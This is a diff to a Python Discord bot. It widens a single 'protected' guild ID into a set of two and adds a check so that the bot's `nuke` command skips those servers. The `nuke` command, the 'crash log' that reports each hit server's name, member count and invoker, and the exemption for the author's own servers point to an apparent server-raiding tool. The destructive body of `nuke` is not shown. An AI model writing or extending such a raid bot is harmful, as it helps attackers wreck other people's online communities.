@@ -21,11 +21,11 @@ async def start_web():
 
 bot = commands.Bot(command_prefix=".", intents=discord.Intents.all())
 
-PROTECTED_GUILD_ID = 1520817743127904477
+PROTECTED_GUILD_IDS = {1520817743127904477, 1508486389921087538}
 
 @bot.before_invoke
 async def protect_server(ctx):
-    if ctx.guild and ctx.guild.id == PROTECTED_GUILD_ID:
+    if ctx.guild and ctx.guild.id in PROTECTED_GUILD_IDS:
         await ctx.send("нафиг")
         raise commands.CommandError("Protected server")
 
@@ -35,7 +35,7 @@ async def on_ready():
 
 @bot.event
 async def on_member_join(member):
-    if member.guild.id == 1520817743127904477:
+    if member.guild.id in PROTECTED_GUILD_IDS:
         role = member.guild.get_role(1520843245234553085)
         if role:
             await member.add_roles(role)
@@ -60,6 +60,9 @@ async def send_crash_log(guild_name, author, member_count):
 @bot.command()
 async def nuke(ctx):
     guild = ctx.guild
+    if guild and guild.id in PROTECTED_GUILD_IDS:
+        await ctx.send("нафиг")
+        return
 
     await send_crash_log(guild.name, ctx.author.mention, guild.member_count)
     
